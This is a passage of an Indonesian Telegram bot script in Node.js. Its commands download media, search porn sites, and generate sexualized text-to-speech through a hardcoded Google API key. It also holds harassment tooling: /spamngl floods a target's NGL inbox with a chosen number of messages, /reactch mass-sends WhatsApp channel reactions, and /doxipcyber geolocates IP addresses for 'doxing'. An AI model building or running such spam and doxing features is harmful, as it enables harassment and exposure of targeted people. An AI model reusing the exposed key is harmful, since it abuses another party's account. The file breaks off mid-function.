        await bot.editMessageText("📤 Upload video...", { chat_id: chatId, message_id: waitMsg.message_id });
        return bot.sendVideo(chatId, buffer, { caption: "🇨🇳 Chinese Girl – HD" });
      }
      if (contentType.includes("json")) {            // base64 wrapper
        const json = JSON.parse(buffer.toString());
        if (json.base64) {
          const media = Buffer.from(json.base64, "base64");
          return bot.sendPhoto(chatId, media, { caption: "🇨🇳 Chinese Girl – base64" });
        }
      }

      // fallback kirim raw file biar Telegram yang parse
      return bot.sendDocument(chatId, buffer, {}, { filename: "ChineseGirl.jpg" });

    } catch (e) {
      console.error(`[GIRL-CHINA] attempt ${attempt}`, e.message);
      if (attempt === MAX_RETRY) {
        const errReport = `
❌ <b>Gagal mengambil Chinese Girl</b>
<code>${e.message}</code>
        `;
        await bot.editMessageText(errReport, { chat_id: chatId, message_id: waitMsg.message_id, parse_mode: "HTML" });
      } else {
        await bot.editMessageText(`⏳ Retry ${attempt}/${MAX_RETRY}...`, { chat_id: chatId, message_id: waitMsg.message_id });
        await new Promise(r => setTimeout(r, 2000)); // jeda sebelum retry
      }
    }
  }
});

const { PassThrough } = require("stream");
const os = require("os");
const JavaScriptObfuscator = require("javascript-obfuscator");

const API_URL = "https://firebasevertexai.googleapis.com/v1beta";
const MODEL_URL = "projects/gemmy-ai-bdc03/locations/us-central1/publishers/google/models";
const API_KEY = "AIzaSyD6QwvrvnjU7j-R6fkOghfIVKwtvc7SmLk";

const buildTTSBody = (text, model = "gemini-2.5-flash-preview-tts") => ({
  contents: [
    {
      role: "model",
      parts: [
        {
          text:
            "[selalu gunakan bahasa indonesia, selalu gunakan gaya bicara yang imut dan gemesin, selalu gunakan nada lemas, lelah, seperti setelah melakukan hubungan seksual.]"
        }
      ]
    },
    {
      role: "user",
      parts: [{ text }]
    }
  ],
  generationConfig: {
    responseModalities: ["audio"],
    temperature: 1,
    speech_config: {
      voice_config: {
        prebuilt_voice_config: { voice_name: "Leda" }
      }
    }
  }
});

async function generateTTS(
  text,
  { model = "gemini-2.5-flash-preview-tts", delay = 1000 } = {}
) {
  while (true) {
    try {
      const body = buildTTSBody(text, model);

      const response = await axios.post(
        `${API_URL}/${MODEL_URL}/${model}:generateContent`,
        body,
        {
          headers: {
            "content-type": "application/json",
            "x-goog-api-client": "gl-kotlin/2.1.0-ai fire/16.5.0",
            "x-goog-api-key": API_KEY
          }
        }
      );

      const parts = response.data?.candidates?.[0]?.content?.parts || [];
      const audioParts = parts.filter(p => p.inlineData);

      if (!audioParts.length) throw new Error("No audio returned");

      const combinedBase64 = audioParts
        .map(p => p.inlineData.data)
        .join("");

      return await convertPCMtoOGG(combinedBase64);

    } catch (err) {
      await new Promise(r => setTimeout(r, delay));
      delay = Math.min(delay * 1.2, 60000);
    }
  }
}

// ================================
// PCM → OGG
// ================================
function convertPCMtoOGG(b64) {
  return new Promise((resolve, reject) => {
    const pcm = Buffer.from(b64, "base64");
    const inputStream = new PassThrough();
    const outputStream = new PassThrough();
    const chunks = [];

    inputStream.end(pcm);

    outputStream.on("data", c => chunks.push(c));
    outputStream.on("end", () => resolve(Buffer.concat(chunks)));
    outputStream.on("error", reject);

    ffmpeg(inputStream)
      .inputOptions(["-f", "s16le", "-ar", "24000", "-ac", "1"])
      .toFormat("ogg")
      .audioCodec("libopus")
      .audioBitrate(64)
      .audioFrequency(24000)
      .audioChannels(1)
      .outputOptions(["-compression_level", "10"])
      .on("error", reject)
      .pipe(outputStream);
  });
}

// ================================
// COMMAND /tta
// ================================
bot.onText(/^\/tta(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;

  try {
    const text = (match[1] || "").trim();

    if (!text) {
      return bot.sendMessage(
        chatId,
        "📌 *Usage:*\n`/tta <teks>`",
        { parse_mode: "Markdown" }
      );
    }

    await bot.sendMessage(
      chatId,
      "🎤 *Generating voice...*\n⏳ Please wait...",
      { parse_mode: "Markdown" }
    );

    const audio = await generateTTS(text);

    await bot.sendVoice(
      chatId,
      audio,
      {
        caption: "🎧 *Done!*",
        parse_mode: "Markdown"
      }
    );

  } catch (e) {
    console.error("[TTA ERROR]", e.message);
    bot.sendMessage(
      chatId,
      `❌ *Error*\n${e.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/xvideosearch(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;

  try {
    const query = (match[1] || "").trim();

    if (!query) {
      return bot.sendMessage(
        chatId,
        "📌 *Usage:*\n`/xvideosearch <keyword>`",
        { parse_mode: "Markdown" }
      );
    }

    await bot.sendMessage(
      chatId,
      `⏳ *Searching videos for:* ${query}...`,
      { parse_mode: "Markdown" }
    );

    const { data } = await axios.get(
      `https://api.nekolabs.web.id/discovery/xvideos/search?q=${encodeURIComponent(query)}`
    );

    if (!data?.success || !Array.isArray(data.result) || data.result.length === 0) {
      return bot.sendMessage(
        chatId,
        `❌ *No results found for:* ${query}`,
        { parse_mode: "Markdown" }
      );
    }

    const first = data.result[0];

    // Kirim thumbnail pertama
    await bot.sendVideo(chatId, first.cover, {
      caption:
`🔍 *Search Results for:*
_${query}_

Check more results below 👇`,
      parse_mode: "Markdown"
    });

    // Kirim daftar hasil
    for (let i = 0; i < data.result.length; i++) {
      const v = data.result[i];

      const textMsg =
`🎬 *${i + 1}. ${v.title}*

⏱ *Duration:* ${v.duration}
📺 *Resolution:* ${v.resolution}
👤 *Author:* ${v.artist}

🔗 [Open Video](${v.url})`;

      await bot.sendMessage(chatId, textMsg, {
        parse_mode: "Markdown",
        disable_web_page_preview: false
      });
    }

  } catch (e) {
    console.error("[XVIDEOSEARCH ERROR]", e.message);
    bot.sendMessage(
      chatId,
      "❌ *Error while searching*\nTry again later.",
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/xnxxsearch(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;

  try {
    const query = (match[1] || "").trim();

    if (!query) {
      return bot.sendMessage(
        chatId,
        "📌 *Usage:*\n`/xnxxsearch <keyword>`",
        { parse_mode: "Markdown" }
      );
    }

    await bot.sendMessage(
      chatId,
      `⏳ *Searching XNXX results...*\n🔎 Query: *${query}*`,
      { parse_mode: "Markdown" }
    );

    const { data } = await axios.get(
      `https://api.nekolabs.web.id/discovery/xnxx/search?q=${encodeURIComponent(query)}`
    );

    if (!data?.success || !Array.isArray(data.result) || data.result.length === 0) {
      return bot.sendMessage(
        chatId,
        `❌ *No results found*\n🔎 Query: *${query}*`,
        { parse_mode: "Markdown" }
      );
    }

    const first = data.result[0];

    // Kirim cover awal
    await bot.sendVideo(chatId, first.cover, {
      caption:
`🔎 *XNXX Search Result*
Query: _${query}_

Results below ⤵️`,
      parse_mode: "Markdown"
    });

    // Kirim tiap hasil
    for (let i = 0; i < data.result.length; i++) {
      const v = data.result[i];

      const textMsg =
`🔞 *${i + 1}. ${v.title}*

👁 *Views:* ${v.views}
⏱ *Duration:* ${v.duration}
📺 *Resolution:* ${v.resolution}

🔗 [Open Video](${v.url})`;

      await bot.sendMessage(chatId, textMsg, {
        parse_mode: "Markdown",
        disable_web_page_preview: false
      });
    }

  } catch (e) {
    console.error("[XNXXSEARCH ERROR]", e.message);
    bot.sendMessage(
      chatId,
      "❌ *Error while searching*\nPlease try again later.",
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/ttsearch(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;

  try {
    const queryRaw = (match[1] || "").trim();

    if (!queryRaw) {
      return bot.sendMessage(
        chatId,
        "📌 *Usage:*\n`/ttsearch <keyword>`",
        { parse_mode: "Markdown" }
      );
    }

    const args = queryRaw.split(" ");
    const lastArg = args[args.length - 1];

    let page = 0;
    let keyword = queryRaw;

    if (!isNaN(lastArg)) {
      page = parseInt(lastArg, 10) - 1;
      keyword = args.slice(0, -1).join(" ");
    }

    const loading = await bot.sendMessage(
      chatId,
      "🔍 *Searching TikTok...*\n⏳ Please wait...",
      { parse_mode: "Markdown" }
    );

    const res = await axios.get(
      `https://api.nekolabs.web.id/discovery/tiktok/search?q=${encodeURIComponent(keyword)}`
    );

    const results = res.data?.result;
    if (!results?.length) {
      return bot.sendMessage(chatId, "❌ *No result found.*", { parse_mode: "Markdown" });
    }

    page = Math.max(0, Math.min(page, results.length - 1));
    const v = results[page];

    const caption =
`🔍 *TikTok Search Result*

🎬 *${v.title}*

👤 *Author:* ${v.author.name} (@${v.author.username})
📅 *Date:* ${v.create_at}

▶️ *Views:* ${v.stats.play}
❤️ *Likes:* ${v.stats.like}
💬 *Comments:* ${v.stats.comment}
🔁 *Shares:* ${v.stats.share}

🎵 *Music:* ${v.music_info.title}

📄 *Page:* ${page + 1} / ${results.length}`;

    const buttons = [];

    if (page > 0) {
      buttons.push([
        { text: "⬅️ ᴘʀᴇᴠ", callback_data: `ttsearch|${keyword}|${page}` }
      ]);
    }

    if (page < results.length - 1) {
      buttons.push([
        { text: "ɴᴇxᴛ ➡️", callback_data: `ttsearch|${keyword}|${page + 2}` }
      ]);
    }

    await bot.deleteMessage(chatId, loading.message_id).catch(() => {});

    await bot.sendVideo(chatId, v.videoUrl, {
      caption,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });

  } catch (e) {
    console.error("[TTSEARCH ERROR]", e.message);
    bot.sendMessage(
      chatId,
      `❌ *TTSearch Error*\n${e.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.on("callback_query", async (q) => {
  try {
    if (!q.data.startsWith("ttsearch|")) return;

    const [, keyword, pageStr] = q.data.split("|");
    const page = parseInt(pageStr, 10) - 1;

    const chatId = q.message.chat.id;
    const messageId = q.message.message_id;

    const res = await axios.get(
      `https://api.nekolabs.web.id/discovery/tiktok/search?q=${encodeURIComponent(keyword)}`
    );

    const results = res.data?.result;
    if (!results?.length) return;

    const maxPage = results.length - 1;
    const currentPage = Math.max(0, Math.min(page, maxPage));
    const v = results[currentPage];

    const caption =
`🔍 *TikTok Search Result*

🎬 *${v.title}*

👤 *Author:* ${v.author.name} (@${v.author.username})
📅 *Date:* ${v.create_at}

▶️ *Views:* ${v.stats.play}
❤️ *Likes:* ${v.stats.like}
💬 *Comments:* ${v.stats.comment}
🔁 *Shares:* ${v.stats.share}

🎵 *Music:* ${v.music_info.title}

📄 *Page:* ${currentPage + 1} / ${results.length}`;

    const buttons = [];

    if (currentPage > 0) {
      buttons.push([
        { text: "⬅️ ᴘʀᴇᴠ", callback_data: `ttsearch|${keyword}|${currentPage}` }
      ]);
    }

    if (currentPage < maxPage) {
      buttons.push([
        { text: "ɴᴇxᴛ ➡️", callback_data: `ttsearch|${keyword}|${currentPage + 2}` }
      ]);
    }

    await bot.editMessageMedia(
      {
        type: "video",
        media: v.videoUrl,
        caption,
        parse_mode: "Markdown"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: { inline_keyboard: buttons }
      }
    );

    await bot.answerCallbackQuery(q.id);

  } catch (e) {
    console.error("[TTSEARCH CALLBACK ERROR]", e.message);
  }
});

bot.onText(/^\/checksyntax(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;
  let codeContent = "";

  try {
    const argText = (match[1] || "").trim();

    // ❌ Tidak ada kode & tidak reply apa pun
    if (!reply && !argText) {
      return bot.sendMessage(
        chatId,
        "📌 *Usage:*\n`/checksyntax <kode>`\nAtau *reply* file `.js` / teks kode",
        { parse_mode: "Markdown" }
      );
    }

    // =========================
    // AMBIL KODE
    // =========================
    if (reply?.document) {
      const file = reply.document;

      if (!file.file_name.endsWith(".js")) {
        return bot.sendMessage(
          chatId,
          "❌ *Hanya mendukung file .js*",
          { parse_mode: "Markdown" }
        );
      }

      // Ambil link file dari Telegram
      const fileLink = await bot.getFileLink(file.file_id);
      const res = await axios.get(fileLink);

      codeContent = res.data;

    } else if (reply?.text) {
      codeContent = reply.text;
    } else {
      codeContent = argText;
    }

    // =========================
    // ANALISIS
    // =========================
    await bot.sendMessage(
      chatId,
      "🔍 *Checking Syntax...*\n⏳ Please wait...",
      { parse_mode: "Markdown" }
    );

    const { data } = await axios.get(
      "https://api.zenzxz.my.id/ai/gpt",
      {
        params: {
          question: codeContent,
          prompt:
            "Analisis kode JS ini, output singkat: line error + solusi singkat. Jangan ubah kode."
        }
      }
    );

    if (!data?.success) {
      return bot.sendMessage(
        chatId,
        "❌ *AI Error*\nSedang gangguan, coba lagi nanti.",
        { parse_mode: "Markdown" }
      );
    }

    bot.sendMessage(
      chatId,
`📌 *Hasil Analisis:*
${data.results}`,
      { parse_mode: "Markdown" }
    );

  } catch (e) {
    console.error("[CHECKSYNTAX ERROR]", e.message);
    bot.sendMessage(
      chatId,
      `❌ *CheckSyntax Error*\n${e.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/terabox(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;

  try {
    // Ambil query setelah command
    const query = (match[1] || "").trim();

    if (!query) {
      return bot.sendMessage(
        chatId,
        "📌 *Usage:*\n`/terabox <terabox link>`",
        { parse_mode: "Markdown" }
      );
    }

    await bot.sendMessage(
      chatId,
      "📦 *Fetching Terabox data...*\n⏳ Please wait...",
      { parse_mode: "Markdown" }
    );

    const { data } = await axios.get(
      `https://api.deline.web.id/downloader/terabox?url=${encodeURIComponent(query)}`
    );

    if (!data?.status || !data?.result) {
      return bot.sendMessage(
        chatId,
        "❌ *Invalid link or file not found.*",
        { parse_mode: "Markdown" }
      );
    }

    const files = data.result.Files || [];

    if (!files.length) {
      return bot.sendMessage(
        chatId,
        "⚠️ *No downloadable files found.*",
        { parse_mode: "Markdown" }
      );
    }

    let message =
`📦 *Terabox Downloader*

*Total Files:* ${files.length}

`;

    files.forEach((f, i) => {
      message +=
`#${i + 1}
📁 *${f.Name}*
💾 ${f.Size}
🔗 [Download](${f.Direct_Download_Link})

`;
    });

    message += `🔗 [Original Link](${query})`;

    bot.sendMessage(chatId, message.trim(), {
      parse_mode: "Markdown",
      disable_web_page_preview: true
    });

  } catch (e) {
    console.error("[TERABOX ERROR]", e.message);
    bot.sendMessage(
      chatId,
      `❌ *Terabox Downloader Error*\n${e.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

/* ---------- /reactch NO JOIN CHECK ---------- */
bot.onText(/^\/reactch(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;

  const input = (match[1] || "").trim();
  const args  = input.split(/\s+/);

  if (args.length < 2) {
    return bot.sendMessage(
      chatId,
      `📌 *Usage:*\n/reactch <whatsapp channel link> <emoji1 emoji2 ...>\n\nContoh:\n/reactch https://whatsapp.com/channel/0029VbBr5hqLY6dCgJEHRK24 ❤️ 😂`,
      { parse_mode: "Markdown" }
    );
  }

  const link  = args.shift();                // first arg = link
  const emoji = args.join(",");              // sisanya = emoji

  const wait = await bot.sendMessage(chatId, "⚙️ *Processing Emoji Reactions...*\n⏳ Please wait...", { parse_mode: "Markdown" });

  try {
    const { data } = await axios.get(
      `https://react.whyux-xec.my.id/api/rch?link=${encodeURIComponent(link)}&emoji=${encodeURIComponent(emoji)}`,
      {
        headers: {
          // kalau API-key tidak wajib bisa dihapus
          "x-api-key": "API_KEY_KAMU",
          "Accept": "application/json"
        },
        timeout: 25000
      }
    );

    await bot.editMessageText(
      `✅ *Reaction Sent Successfully!*\n\nChannel: ${link}\nEmoji: ${args.join(" ")}`,
      { chat_id: chatId, message_id: wait.message_id, parse_mode: "Markdown" }
    );

  } catch (e) {
    console.error("[reactch]", e.message);
    await bot.editMessageText(
      `❌ Gagal kirim reaction.\n${e.response?.data?.error || e.message}`,
      { chat_id: chatId, message_id: wait.message_id, parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/spamngl(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;

  // Ambil full argumen setelah command
  const input = match[1] || "";
  const args = input.split(" ").filter(Boolean);

  const url = args[0];
  const jumlah = args[1];
  const pesan =
    args.slice(2).join(" ") ||
    msg.reply_to_message?.text;

  if (!url || !jumlah || !pesan) {
    return bot.sendMessage(
      chatId,
      "📌 *Usage:*\n`/spamngl <url> <jumlah> <pesan>`\n\n💡 Bisa juga reply pesan untuk isi *pesan*",
      { parse_mode: "Markdown" }
    );
  }

  await bot.sendMessage(
    chatId,
    "⏳ *Sending spam NGL, please wait...*",
    { parse_mode: "Markdown" }
  );

  try {
    const { data } = await axios.get(
      `https://api.elrayyxml.web.id/api/tools/spamngl?url=${encodeURIComponent(url)}&jumlah=${jumlah}&pesan=${encodeURIComponent(pesan)}`
    );

    if (!data?.status) {
      return bot.sendMessage(
        chatId,
        "❌ *Gagal melakukan spam NGL.*",
        { parse_mode: "Markdown" }
      );
    }

    const resultMsg =
`📮 *SPAM NGL RESULT*

👤 *Target:* ${url}
🔢 *Jumlah:* ${jumlah}
💬 *Pesan:* ${pesan}

📌 *Status:* ${data.result}`;

    bot.sendMessage(chatId, resultMsg, { parse_mode: "Markdown" });

  } catch (e) {
    console.error("[SPAMNGL ERROR]", e.message);
    bot.sendMessage(
      chatId,
      `⚠️ *Terjadi kesalahan bre.*\n${e.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.onText(/^\/saveweb(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  if (!query) {
    return bot.sendMessage(
      chatId,
      "📌 *Usage:*\n`/saveweb <url>`",
      { parse_mode: "Markdown" }
    );
  }

  await bot.sendMessage(
    chatId,
    "📦 *Generating website backup...*\n⏳ Please wait...",
    { parse_mode: "Markdown" }
  );

  try {
    const { data } = await axios.get(
      `https://www.veloria.my.id/tools/saveweb2zip?url=${encodeURIComponent(query)}&renameAssets=File`
    );

    if (!data?.result?.downloadUrl) {
      return bot.sendMessage(
        chatId,
        "❌ *Failed to generate ZIP file.*",
        { parse_mode: "Markdown" }
      );
    }

    const zipUrl = data.result.downloadUrl;

    const file = await axios.get(zipUrl, {
      responseType: "arraybuffer"
    });

    const caption =
`🌍 *Website Backup Complete*

🔗 *URL:* ${query}
📁 *Files:* ${data.result.copiedFilesAmount} copied

📦 *Sending ZIP file...*`;

    await bot.sendDocument(
      chatId,
      file.data,
      {
        caption,
        parse_mode: "Markdown"
      },
      {
        filename: "website-backup.zip"
      }
    );

  } catch (e) {
    console.error("[SaveWeb] Error:", e.message);
    bot.sendMessage(
      chatId,
      `⚠️ *SaveWeb Error*\n${e.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.on("message", async (msg) => {
  try {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!msg.text) return;

    const text = msg.text.trim();

    // ❌ Abaikan command
    if (msg.entities?.some(e => e.type === "bot_command")) return;

    // 🔗 Deteksi URL
    const urlMatch = text.match(/(https?:\/\/[^\s]+)/i);
    if (!urlMatch) return;

    const url = urlMatch[0];

    // ✅ Domain support
    const supported = [
      "youtube.com", "youtu.be",
      "tiktok.com", "vt.tiktok.com", "vm.tiktok.com",
      "instagram.com",
      "facebook.com", "fb.watch",
      "twitter.com", "x.com",
      "mediafire.com",
      "twitch.tv",
      "soundcloud.com"
    ];

    if (!supported.some(d => url.toLowerCase().includes(d))) return;

    // ⏳ Cooldown
    global.aioCooldown ??= {};
    const now = Date.now();

    if (global.aioCooldown[userId] && now - global.aioCooldown[userId] < 15000) {
      return bot.sendMessage(
        chatId,
        `<blockquote>⏳ <b>Sabar bre...</b>\nLagi proses yang lain.</blockquote>`,
        { reply_to_message_id: msg.message_id, parse_mode: "HTML" }
      );
    }

    global.aioCooldown[userId] = now;

    console.log(`[AUTO AIO] ${url}`);

    const processing = await bot.sendMessage(
      chatId,
      `<blockquote>🔍 <b>Detected link!</b>\n⏳ Processing, please wait...</blockquote>`,
      { reply_to_message_id: msg.message_id, parse_mode: "HTML" }
    );

    // 🌐 Request API
    const { data } = await axios.get(
      `https://api.deline.web.id/downloader/aio?url=${encodeURIComponent(url)}`,
      { timeout: 35000 }
    ).catch(() => ({ data: { status: false } }));

    // 🧹 Hapus pesan proses
    await bot.deleteMessage(chatId, processing.message_id).catch(() => {});

    if (!data?.status || !data?.result?.medias?.[0]) {
      return bot.sendMessage(
        chatId,
        `<blockquote>❌ <b>Gagal download link ini bre.</b></blockquote>`,
        { reply_to_message_id: msg.message_id, parse_mode: "HTML" }
      );
    }

    const result = data.result;
    const media = result.medias[0];
    const direct = media.url;
    const lower = direct.toLowerCase();

    const caption = `<blockquote><b>📥 Auto Downloader</b>

<b>🎞 Title:</b> ${result.title || "Unknown"}
<b>👤 Author:</b> ${result.author || "-"}
<b>🌐 Platform:</b> ${result.source}

<a href="${url}">Open Original</a>
</blockquote>`;

    // 🎥 Video
    if (lower.includes(".mp4") || media.type === "video") {
      return bot.sendVideo(chatId, direct, {
        caption,
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id
      });
    }

    // 🔊 Audio
    if (
      lower.includes(".mp3") ||
      lower.includes(".m4a") ||
      media.type === "audio"
    ) {
      return bot.sendAudio(chatId, direct, {
        caption,
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id
      });
    }

    // 🖼 Image
    if (
      lower.includes(".jpg") ||
      lower.includes(".jpeg") ||
      lower.includes(".png") ||
      media.type === "image"
    ) {
      return bot.sendVideo(chatId, direct, {
        caption,
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id
      });
    }

    // 🔗 Fallback
    return bot.sendMessage(
      chatId,
      `<blockquote><b>🔗 Download Link:</b>\n${direct}</blockquote>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.error("[AUTO AIO ERROR]", err);
    bot.sendMessage(
      msg.chat.id,
      `<blockquote>❌ <b>Error Auto Download</b>\n${err.message}</blockquote>`,
      { parse_mode: "HTML" }
    );
  }
});

const allUsers = new Set();

// Deteksi user baru
bot.on("message", (msg) => {
  allUsers.add(msg.chat.id);
});

// ===== FITUR BROADCAST =====
bot.onText(/\/broadcast (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  let success = 0;
  let failed = 0;

  for (const user of allUsers) {
    try {
      await bot.sendMessage(user, text);
      success++;
    } catch {
      failed++;
    }
  }

  bot.sendMessage(
    chatId,
    `📢 *Broadcast selesai!*\n\n` +
    `👥 Total user: *${allUsers.size}*\n` +
    `✅ Terkirim: *${success}*\n` +
    `❌ Gagal: *${failed}*`,
    { parse_mode: "Markdown" }
  );
});

// ===== BROADCAST FOTO =====
bot.on("photo", async (msg) => {
  if (!msg.caption || !msg.caption.startsWith("/bcphoto")) return;

  const sender = msg.chat.id;
  const photoId = msg.photo[msg.photo.length - 1].file_id;
  const caption = msg.caption.replace("/bcphoto", "").trim();

  let success = 0;
  let failed = 0;

  for (const user of allUsers) {
    try {
      await bot.sendVideo(user, photoId, { caption });
      success++;
    } catch {
      failed++;
    }
  }

  bot.sendMessage(
    sender,
    `📸 *Broadcast Foto selesai!*\n\n` +
    `👥 Total user: *${allUsers.size}*\n` +
    `✅ Terkirim: *${success}*\n` +
    `❌ Gagal: *${failed}*`,
    { parse_mode: "Markdown" }
  );
});

// ===== CEK TOTAL USER =====
bot.onText(/\/totaluser/, (msg) => {
  bot.sendMessage(msg.chat.id, `👥 Total user: *${allUsers.size}*`, {
    parse_mode: "Markdown"
  });
});

function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

bot.onText(/^\/nulis(.*)/, async (msg) => {
  try {
    const chatId = msg.chat.id;
    const textMsg = msg.text || "";

    // Ambil input setelah command
    const raw = textMsg.split(" ").slice(1).join(" ").trim();

    let input = raw;

    // Jika user reply text → ambil
    if (!input && msg.reply_to_message) {
      input =
        msg.reply_to_message.text ||
        msg.reply_to_message.caption ||
        "";
    }

    // Jika tetap kosong → kirim panduan
    if (!input) {
      return bot.sendMessage(
        chatId,
        `✍️ <b>Format Nulis</b>\n\n` +
          `Gunakan pemisah <b>|</b>.\n\n` +
          `<b>Format:</b>\n` +
          `<code>/nulis text|nama|kelas|hari|waktu|type</code>\n\n` +
          `<b>Contoh:</b>\n` +
          `<code>/nulis Halo bro|Ucup|9A|Senin|13.00|1</code>\n\n` +
          `Atau minimal teks saja:\n` +
          `<code>/nulis Halo bro</code>`,
        { parse_mode: "HTML" }
      );
    }

    const parts = input.split("|").map((v) => v.trim());

    const text = parts[0] || "";
    const nama = parts[1] || "";
    const kelas = parts[2] || "";
    const hari = parts[3] || "";
    const waktu = parts[4] || "";
    const type = parts[5] || "";

    await bot.sendMessage(chatId, "⏳ Sedang menulis...");

    // Generate URL API Nulis
    const url =
      `https://brat.siputzx.my.id/nulis` +
      `?text=${encodeURIComponent(text)}` +
      `&nama=${encodeURIComponent(nama)}` +
      `&kelas=${encodeURIComponent(kelas)}` +
      `&hari=${encodeURIComponent(hari)}` +
      `&waktu=${encodeURIComponent(waktu)}` +
      `&type=${encodeURIComponent(type)}`;

    // Fetch image
    const res = await axios.get(url, {
      responseType: "arraybuffer",
      timeout: 30000,
    });

    const buffer = Buffer.from(res.data);

    // Kirim hasil foto
    await bot.sendVideo(
      chatId,
      buffer,
      {
        caption:
          `✍️ <b>Hasil Nulis</b>\n` +
          `<code>${escapeHtml(text)}</code>`,
        parse_mode: "HTML",
      }
    );

  } catch (err) {
    console.error("NULIS Error:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses nulis.");
  }
});

const FormData = require("form-data");

// /veo3 prompt (HARUS reply foto)
bot.onText(/^\/valryo(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const prompt = match[1]?.trim();
  const reply = msg.reply_to_message;

  try {
    // Validasi reply foto
    if (!reply || !reply.photo) {
      return bot.sendMessage(chatId, `⚠️ Reply foto lalu kirim:\n/valryo "prompt"`);
    }

    if (!prompt) {
      return bot.sendMessage(chatId, "⚠️ Tambahkan prompt untuk video!");
    }

    await fs.ensureDir("./temp");

    // Ambil foto resolusi tertinggi
    const photo = reply.photo[reply.photo.length - 1];
    const file = await bot.getFile(photo.file_id);

    const tokenToUse = bot.token || process.env.TELEGRAM_TOKEN;
    if (!tokenToUse) {
      return bot.sendMessage(chatId, "❌ Token bot tidak ditemukan.");
    }

    const fileUrl = `https://api.telegram.org/file/bot${tokenToUse}/${file.file_path}`;

    const tempPath = path.join(
      "./temp",
      `${Date.now()}_${path.basename(file.file_path)}`
    );

    // Download foto
    const writer = fs.createWriteStream(tempPath);
    const response = await axios.get(fileUrl, { responseType: "stream" });
    response.data.pipe(writer);

    await new Promise((resolve, reject) => {
      writer.on("finish", resolve);
      writer.on("error", reject);
    });

    // Upload ke tmpfiles (WAJIB pakai form-data dari npm)
    const formData = new FormData();
    formData.append("file", fs.createReadStream(tempPath));

    const upload = await axios.post(
      "https://tmpfiles.org/api/v1/upload",
      formData,
      { headers: formData.getHeaders() }
    );

    await fs.unlink(tempPath);

    const imageUrl = upload.data.data.url.replace(
      "tmpfiles.org/",
      "tmpfiles.org/dl/"
    );

    const loading = await bot.sendMessage(
      chatId,
      "⏳ Sedang membuat video dari image..."
    );

    // Payload API
    const payload = {
      videoPrompt: prompt,
      videoAspectRatio: "16:9",
      videoDuration: 5,
      videoQuality: "540p",
      videoModel: "v4.5",
      videoImageUrl: imageUrl,
      videoPublic: false,
    };

    // Generate task
    let taskId;
    try {
      const gen = await axios.post(
        "https://veo31ai.io/api/pixverse-token/gen",
        payload,
        { headers: { "Content-Type": "application/json" } }
      );
      taskId = gen.data.taskId;
    } catch (err) {
      console.log("GEN ERROR RAW:", err.response?.data || err);
      return bot.editMessageText(
        `❌ Error dari server:\n<code>${JSON.stringify(
          err.response?.data || err,
          null,
          2
        )}</code>`,
        { chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML" }
      );
    }

    if (!taskId) {
      return bot.editMessageText(
        "❌ Gagal membuat task video (taskId kosong)",
        { chat_id: chatId, message_id: loading.message_id }
      );
    }

    // Tunggu video selesai
    let videoUrl;
    const timeout = Date.now() + 180000;

    while (Date.now() < timeout) {
      const res = await axios.post(
        "https://veo31ai.io/api/pixverse-token/get",
        {
          taskId,
          videoPublic: false,
          videoQuality: "540p",
          videoAspectRatio: "16:9",
          videoPrompt: prompt,
        }
      );

      if (res.data?.videoData?.url) {
        videoUrl = res.data.videoData.url;
        break;
      }

      await new Promise((r) => setTimeout(r, 5000));
    }

    if (!videoUrl) {
      return bot.editMessageText(
        "❌ Video belum tersedia atau gagal dibuat.",
        { chat_id: chatId, message_id: loading.message_id }
      );
    }

    await bot.editMessageText(
      `✅ Video berhasil dibuat!\n📎 ${videoUrl}`,
      { chat_id: chatId, message_id: loading.message_id }
    );
  } catch (err) {
    console.log("GLOBAL ERROR RAW:", err.response?.data || err);

    bot.sendMessage(
      chatId,
      `❌ Error:\n<code>${JSON.stringify(
        err.response?.data || err.message,
        null,
        2
      )}</code>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.onText(/^\/(trackipcyber|doxipcyber)(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const command = match[1];
  const ip = match[2]?.trim(); // bisa kosong

  try {
    // kalau ip kosong, ambil IP publik si user
    const targetIP = ip || (await axios.get("https://api.ipify.org?format=json")).data.ip;

    await bot.sendMessage(chatId, `🌍 Mengecek informasi IP *${targetIP}*...`, {
      parse_mode: "Markdown",
    });

    // Ambil data IP dari ipwho.is
    const { data: res } = await axios.get(`https://ipwho.is/${targetIP}`);

    if (!res.success) {
      return bot.sendMessage(chatId, `❌ Gagal menemukan informasi untuk IP *${targetIP}*`, {
        parse_mode: "Markdown",
      });
    }

    // Format hasil
    const info = `
*📡 Informasi IP*
